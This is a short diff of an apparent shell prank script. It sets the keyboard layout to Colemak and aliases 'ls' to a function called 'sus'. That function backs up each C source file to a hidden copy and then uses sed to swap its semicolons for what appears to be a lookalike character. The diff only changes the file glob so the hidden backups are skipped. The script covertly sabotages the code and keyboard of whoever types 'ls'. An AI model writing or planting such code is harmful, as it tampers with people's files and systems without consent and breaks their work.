@@ -3,7 +3,7 @@ setxkbmap us -variant colemak
 alias ls="sus"
 
 sus() {
-    for f in *.c; do
+    for f in [^.]*.c; do
     echo "$f"
     cp "$f" ".original-${f}.c"
     sed -i 's/;/;/g' $f
